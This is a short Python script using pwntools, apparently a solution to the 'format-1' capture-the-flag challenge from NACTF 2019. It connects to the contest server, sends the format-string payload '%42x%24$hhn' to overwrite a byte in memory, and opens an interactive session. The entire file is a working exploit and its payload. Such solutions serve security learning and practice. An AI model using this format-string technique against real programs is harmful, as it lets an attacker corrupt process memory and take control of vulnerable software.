from pwn import *

# a = process('./format-1')
a = remote('shell.2019.nactf.com', 31560)
raw_input('Debug')

buf = '%42x%24$hhn'

a.recvuntil('Type something>')
a.sendline(buf)

a.interactive()